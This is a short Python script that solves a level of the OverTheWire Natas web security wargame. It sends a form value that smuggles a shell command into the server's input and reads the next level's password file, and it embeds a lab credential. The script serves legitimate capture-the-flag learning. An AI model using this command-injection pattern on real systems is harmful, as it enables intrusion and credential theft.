import requests
import re

username = "natas9"
password = "W0mMhUcRRnG8dcghE4qvk3JA9lGt8nDl"

url = 'http://{}.natas.labs.overthewire.org'.format(username)
r = requests.post(url, auth=(username, password), data={"needle": "qwertya; cat /etc/natas_webpass/natas10; echo "})

content = r.text

print("\n\nthe password for next level = ", re.findall("<pre>\n(.*)", content)[0])
